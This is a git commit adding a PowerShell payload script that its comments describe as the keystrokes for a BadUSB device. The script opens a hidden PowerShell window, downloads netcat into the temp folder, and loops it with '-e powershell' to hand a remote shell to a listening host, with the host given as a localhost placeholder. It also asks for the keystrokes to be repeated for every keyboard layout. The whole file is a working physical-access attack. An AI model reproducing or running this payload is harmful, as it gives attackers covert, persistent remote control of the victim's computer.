582e644640c830af5812dd4aa24479e394194f6e
Commaders <92375418+Commaders@users.noreply.github.com>
2021-12-12 10:55:09 +0800

    Create toType.ps1

---
+++ arduino_sketch/toType.ps1
@@ -0,0 +1,12 @@
+#this is the code that needs to be run by the BadUSB.
+#it opens powershell, downloads and runs netcat
+
+#https://community.idera.com/database-tools/powershell/ask_the_experts/f/learn_powershell_from_don_jones-24/22103/continuous-loop
+#https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7.1
+
+[GUI r]
+
+#powershell -WindowStyle Hidden -c "$p = """$env:temp/nc.exe""";(New-Object System.Net.WebClient).DownloadFile("""http://localhost/""", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList """localhost""","""81""","""-e""","""powershell"""}"
+powershell -WindowStyle Hidden [ENTER]
+$p = "$env:temp/nc.exe";(New-Object System.Net.WebClient).DownloadFile("http://localhost:54414/", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList "localhost","47017","-e","powershell";sleep 1} [ENTER] [ENTER]
+[REPEAT WITH EVERY KEYBOARD LAYOUT]
